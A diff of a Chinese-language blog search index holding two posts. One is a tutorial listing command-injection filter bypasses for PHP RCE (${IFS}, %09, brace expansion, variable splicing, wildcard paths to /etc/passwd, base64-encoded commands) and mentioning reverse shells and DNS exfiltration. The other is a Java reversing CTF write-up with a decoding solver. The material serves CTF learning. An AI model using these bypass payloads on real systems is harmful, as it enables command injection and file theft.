+<h5 id="5-命令连接符"><a href="#5-命令连接符" class="headerlink" title="5||命令连接符"></a>5||命令连接符</h5><p>类似于if-else语句,前面执行后面不执行,前面执行失败后面执行</p>
+<h3 id="命令执行绕过"><a href="#命令执行绕过" class="headerlink" title="命令执行绕过"></a>命令执行绕过</h3><h4 id="1-绕过空格过滤"><a href="#1-绕过空格过滤" class="headerlink" title="1.绕过空格过滤"></a>1.绕过空格过滤</h4><h5 id="1-IFS-绕过"><a href="#1-IFS-绕过" class="headerlink" title="1)${IFS}绕过"></a>1)${IFS}绕过</h5><p>$IFS是shell的特殊环境变量,是linux下的内部域分隔符.${IFS}中存储的值可以是空格/制表符/换行符或者其他自定义符号</p>
+<h5 id="2-IFS-9绕过"><a href="#2-IFS-9绕过" class="headerlink" title="2)$IFS$9绕过"></a>2)$IFS$9绕过</h5><h5 id="3-制表符绕过"><a href="#3-制表符绕过" class="headerlink" title="3)制表符绕过"></a>3)制表符绕过</h5><p>%09是制表符的url编码,可以通过%09来代替空格,绕过空格过滤</p>
+<h5 id="4-绕过"><a href="#4-绕过" class="headerlink" title="4){ }绕过"></a>4){ }绕过</h5><p>空格过滤可以用{ }绕过,例如</p>
+<p>{cat,index.php}</p>
+<h5 id="5-lt-绕过"><a href="#5-lt-绕过" class="headerlink" title="5)&lt;绕过"></a>5)&lt;绕过</h5><p>例如cat&lt;index.php</p>
+<h4 id="2-绕过关键字过滤"><a href="#2-绕过关键字过滤" class="headerlink" title="2.绕过关键字过滤"></a>2.绕过关键字过滤</h4><p><strong>利用反引号绕过``包裹的内容在php中会被当成系统命令执行</strong></p>
+<h5 id="1-变量拼接绕过"><a href="#1-变量拼接绕过" class="headerlink" title="1)变量拼接绕过"></a>1)变量拼接绕过</h5><p>linux支持变量赋值,可以通过变量拼接来绕过过滤规则</p>
+<p>例如</p>
+<p>$a=c;$b=at;$a$b index.php</p>
+<h5 id="2-空变量绕过"><a href="#2-空变量绕过" class="headerlink" title="2)空变量绕过"></a>2)空变量绕过</h5><p>例如,可以通过空变量绕过cat命令过滤</p>
+<p>ca${x}t index.php</p>
+<h5 id="3-系统变量绕过"><a href="#3-系统变量绕过" class="headerlink" title="3)系统变量绕过"></a>3)系统变量绕过</h5><p>${SHELLOPTS}是系统变量,可以利用系统变量的字符拼接绕过过滤</p>
+<h5 id="4-绕过-1"><a href="#4-绕过-1" class="headerlink" title="4)\绕过"></a>4)\绕过</h5><p>可以通过c\a\t index.php绕过cat命令过滤</p>
+<h5 id="5-通配符绕过-简单正则"><a href="#5-通配符绕过-简单正则" class="headerlink" title="5)通配符绕过(简单正则)"></a>5)通配符绕过(简单正则)</h5><p>linux支持利用通配符进行字符匹配.通配符的作用是在模糊查询时表示文件名中某些不确定的字符</p>
+<p>通配符规则如下:</p>
+<ul>
+<li>*表示0到多个任意字符</li>
+<li>?代表一个任意字符</li>
+<li>[ ]内为字符范围,代表该字符范围中的任意一个字符</li>
+</ul>
+<p>例如对于/etc/passwd可以使用/???/???sw?来绕过</p>
+<h5 id="6-shell反弹绕过"><a href="#6-shell反弹绕过" class="headerlink" title="6)shell反弹绕过"></a>6)shell反弹绕过</h5><h5 id="7-Base64编码绕过"><a href="#7-Base64编码绕过" class="headerlink" title="7)Base64编码绕过"></a>7)Base64编码绕过</h5><p>利用系统函数base64对命令进行base64编码,以绕过过滤,例如,id命令的base64编码为aWQ=,再利用base64 -d对aWQ=进行解码,就绕过了过滤</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">echo &quot;aWQ=&quot;|base64 -d</span><br></pre></td></tr></table></figure>
+
+<p>原理:利用echo和管道符向base64输入aWQ=,然后由base64 -d解码为id,再因外面包裹的``反引号,将id当命令执行</p>
+<h5 id="8-利用expr和awk绕过"><a href="#8-利用expr和awk绕过" class="headerlink" title="8)利用expr和awk绕过"></a>8)利用expr和awk绕过</h5><p>通过expr和awk命令从其他的文件中获取字符并进行命令构造</p>
+<p>例如</p>
+<h5 id="9-无回显的命令执行如果存在命令执行漏洞-但是没有回显-可以通过shell反弹的方式将shell反弹到vps上-然后通过vps执行命令-如果无法反弹shell-也可以通过-DNS管道解析的方式获取命令的执行结果"><a href="#9-无回显的命令执行如果存在命令执行漏洞-但是没有回显-可以通过shell反弹的方式将shell反弹到vps上-然后通过vps执行命令-如果无法反弹shell-也可以通过-DNS管道解析的方式获取命令的执行结果" class="headerlink" title="9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果"></a>9)无回显的命令执行如果存在命令执行漏洞,但是没有回显,可以通过shell反弹的方式将shell反弹到vps上,然后通过vps执行命令.如果无法反弹shell,也可以通过 DNS管道解析的方式获取命令的执行结果</h5>]]></content>
+      <categories>
+        <category>web</category>
+      </categories>
+      <tags>
+        <tag>php</tag>
+        <tag>RCE</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>一些有意思的题目</title>
+    <url>/2022/03/27/%E4%B8%80%E4%BA%9B%E6%9C%89%E6%84%8F%E6%80%9D%E7%9A%84%E9%A2%98%E7%9B%AE/</url>
+    <content><![CDATA[<p>一些简单但是很有意思的题目<span id="more"></span></p>
+<h4 id="buu-Java逆向解密"><a href="#buu-Java逆向解密" class="headerlink" title="buu Java逆向解密"></a>buu Java逆向解密</h4><p>想做java题在buu搜偶然搜到的,虽然很简单,但是也有学习到东西</p>
+<p>下载附件打开是一个class文件,利用jd-jui逆向得到代码</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Reverse</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span></span><br><span class="line"><span class="function">  </span>&#123;</span><br><span class="line">    Scanner s = <span class="keyword">new</span> Scanner(System.in);</span><br><span class="line">    System.out.println(<span class="string">&quot;Please input the flag ：&quot;</span>);</span><br><span class="line">    String str = s.next();</span><br><span class="line">    System.out.println(<span class="string">&quot;Your input is ：&quot;</span>);</span><br><span class="line">    System.out.println(str);</span><br><span class="line">    <span class="keyword">char</span>[] stringArr = str.toCharArray();</span><br><span class="line">    Encrypt(stringArr);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Encrypt</span><span class="params">(<span class="keyword">char</span>[] arr)</span> </span>&#123;</span><br><span class="line">    ArrayList Resultlist = <span class="keyword">new</span> ArrayList();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; arr.length; i++) &#123;</span><br><span class="line">      <span class="keyword">int</span> result = arr[i] + <span class="string">&#x27;@&#x27;</span> ^ <span class="number">0x20</span>;</span><br><span class="line">      Resultlist.add(Integer.valueOf(result));</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span>[] KEY = &#123; <span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span> &#125;;</span><br><span class="line">    ArrayList KEYList = <span class="keyword">new</span> ArrayList();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; KEY.length; j++) &#123;</span><br><span class="line">      KEYList.add(Integer.valueOf(KEY[j]));</span><br><span class="line">    &#125;</span><br><span class="line">    System.out.println(<span class="string">&quot;Result:&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (Resultlist.equals(KEYList))</span><br><span class="line">      System.out.println(<span class="string">&quot;Congratulations！&quot;</span>);</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      System.err.println(<span class="string">&quot;Error！&quot;</span>);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p><code>int result = arr[i] + &#39;@&#39; ^ 0x20;</code></p>
+<p>这块的意思是先+64再与32异或,起初以为是+64与32的异或结果,后来找到了运算优先级,逻辑运算符号的运算级优先级普遍低于正常的加减乘除</p>
+<p><img src="https://picture-1304716932.cos.ap-chengdu.myqcloud.com/youxianji.jpg" alt="youxianji"></p>
+<p>还有就是java整数与ascii之间的转换</p>
+<p>数组与数组直接的转换</p>
+<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span>[] KEY = &#123; <span class="number">180</span>, <span class="number">136</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">137</span>, <span class="number">147</span>, <span class="number">191</span>, <span class="number">148</span>, <span class="number">136</span>, <span class="number">133</span>, <span class="number">191</span>, <span class="number">134</span>, <span class="number">140</span>, <span class="number">129</span>, <span class="number">135</span>, <span class="number">191</span>, <span class="number">65</span> &#125;;</span><br><span class="line">        ArrayList&lt;Integer&gt; arrayList = <span class="keyword">new</span> ArrayList&lt;Integer&gt;();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;KEY.length;i++)&#123;</span><br><span class="line">            arrayList.add(KEY[i]-<span class="number">64</span>^<span class="number">32</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        Integer[] array=<span class="keyword">new</span> Integer[arrayList.size()];</span><br><span class="line">        arrayList.toArray(array);</span><br><span class="line">        System.out.println(array);</span><br><span class="line">        StringBuilder s=<span class="keyword">new</span> StringBuilder();</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;array.length;i++)&#123;</span><br><span class="line">            <span class="keyword">int</span> a=array[i];</span><br><span class="line">            s.append((<span class="keyword">char</span>)a);</span><br><span class="line">        &#125;</span><br><span class="line">        System.out.println(s);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+
+]]></content>
+      <categories>
+        <category>ctf</category>
+      </categories>
+      <tags>
+        <tag>java</tag>
+        <tag>ctf</tag>
       </tags>
   </entry>
 </search>
